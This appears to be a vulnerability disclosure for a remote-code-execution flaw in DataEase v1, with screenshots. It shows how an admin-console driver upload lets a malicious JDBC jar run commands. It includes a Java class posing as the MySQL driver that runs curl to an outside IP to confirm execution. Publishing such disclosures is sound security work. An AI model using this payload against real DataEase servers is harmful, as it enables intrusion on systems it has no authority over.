

- Official website : https://dataease.io/

- installation manual : https://community.fit2cloud.com/#/products/dataease/getstarted

- Vulnerable version : v1

- How to Install:

```
curl -sSL https://dataease.oss-cn-hangzhou.aliyuncs.com/quick_start.sh | sh
```

![image-20241219110457770](imgs/DataEase-v1-code-execute/image-20241219110457770.png)

- Vulnerability Exploitation

1. Login Console

2. Enter sequentially `数据源` -> `驱动管理`

![image-20241219110703942](imgs/DataEase-v1-code-execute/image-20241219110703942.png)

3. select `添加驱动`

![image-20241219110914562](imgs/DataEase-v1-code-execute/image-20241219110914562.png)

4.  click`保存`

![image-20241219111033263](imgs/DataEase-v1-code-execute/image-20241219111033263.png)

5.  click`驱动名称-test`, Edit this driver

![image-20241219111242789](imgs/DataEase-v1-code-execute/image-20241219111242789.png)

```java
package com.mysql.jdbc;

public class Driver {
    public Driver(){
        try{
            Runtime.getRuntime().exec("curl http://192.168.1.107:1234/rce");
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] argv){
        Driver e = new Driver();
    }
}
```

- Package the above code into a jar file
- Upload jar file And fill in the content in the picture

![image-20241219115024145](imgs/DataEase-v1-code-execute/image-20241219115024145.png)

- Add MySQL data source

![image-20241219115131684](imgs/DataEase-v1-code-execute/image-20241219115131684.png)

- `驱动` Choose the driver we created

![image-20241219115219368](imgs/DataEase-v1-code-execute/image-20241219115219368.png)

- click `保存`

![image-20241219115327424](imgs/DataEase-v1-code-execute/image-20241219115327424.png)

- Successfully received curl request

![image-20241219115420517](imgs/DataEase-v1-code-execute/image-20241219115420517.png)